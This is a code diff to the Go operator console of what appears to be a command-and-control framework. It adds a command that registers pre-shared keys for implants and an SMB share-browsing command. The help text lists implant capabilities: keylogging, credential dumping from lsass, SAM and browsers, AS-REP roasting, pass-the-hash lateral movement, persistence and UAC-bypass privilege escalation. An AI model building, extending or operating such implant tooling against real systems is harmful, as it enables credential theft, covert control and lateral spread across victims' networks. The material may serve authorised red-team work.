@@ -43,8 +43,9 @@ func (c *Commands) Handlers() map[string]CommandHandler {
 		"ifconfig":  c.cmdIfconfig,
 		"portscan":  c.cmdPortscan,
 		"sleep":     c.cmdSleep,
-		"generate":  c.cmdGenerate,
-		"tasks":     c.cmdTasks,
+		"generate":         c.cmdGenerate,
+		"register-secret":  c.cmdRegisterSecret,
+		"tasks":            c.cmdTasks,
 		"result":    c.cmdResult,
 		"loot":      c.cmdLoot,
 		"events":    c.cmdEvents,
@@ -60,6 +61,7 @@ func (c *Commands) Handlers() map[string]CommandHandler {
 		"asreproast":   c.cmdASREPRoast,
 		"creds-dump":   c.cmdCredsDump,
 		"lateral":      c.cmdLateral,
+		"smb":          c.cmdSMB,
 		"persist":      c.cmdPersist,
 		"privesc":      c.cmdPrivesc,
 		"exit":         c.cmdExit,
@@ -466,6 +468,33 @@ func (c *Commands) cmdGenerate(args []string) error {
 	return nil
 }
 
+func (c *Commands) cmdRegisterSecret(args []string) error {
+	if len(args) < 2 {
+		return fmt.Errorf("usage: register-secret <implant_id> <secret_hex> [build_id]\n  Registers a per-implant PSK for manual/ldflags builds (64 hex chars)")
+	}
+	implantID := args[0]
+	secretHex := args[1]
+	buildID := "manual"
+	if len(args) >= 3 {
+		buildID = args[2]
+	}
+	ctx, cancel := c.ctx()
+	defer cancel()
+	resp, err := c.client.RegisterImplantSecret(ctx, &pb.RegisterImplantSecretRequest{
+		ImplantId: implantID,
+		SecretHex: secretHex,
+		BuildId:   buildID,
+	})
+	if err != nil {
+		return err
+	}
+	if !resp.Success {
+		return fmt.Errorf("%s", resp.Error)
+	}
+	fmt.Printf("Registered sealed secret for implant %s (build_id=%s)\n", implantID, buildID)
+	return nil
+}
+
 func (c *Commands) cmdTasks(_ []string) error {
 	if err := c.requireSession(); err != nil {
 		return err
@@ -692,6 +721,7 @@ func (c *Commands) cmdHelp(_ []string) error {
   portscan <host> <ports> - TCP port scan
   sleep <ms> [jitter]   - Set beacon interval
   generate [opts]       - Build implant (see: generate --help)
+  register-secret <id> <hex> [build_id] - Register PSK for manual implant builds
   screenshot            - Take screenshot
   keylog <start|stop|dump> - Keylogger control
   ldap-enum <type> --domain <d> --dc <dc> - LDAP AD enumeration
@@ -699,6 +729,8 @@ func (c *Commands) cmdHelp(_ []string) error {
   asreproast --domain <d> --dc <dc>
   creds-dump <lsass|sam|browser>
   lateral <wmi|winrm|psexec> <target> <command> [--user u] [--pass p] [--hash h]
+  smb <list_shares|list_dir|download> --host h [--share s] [--path p] [--user u] [--pass p] [--hash h] [--anon]
+  ldap-enum <query_type> --domain d --dc dc [--user u] [--pass p] [--hash h]
   persist <schtask|registry|service> [--name n] [--path p] [--trigger t]
   privesc <token|uac_fodhelper|uac_eventvwr> [--pid n] [--command c]
   tasks                 - List session tasks
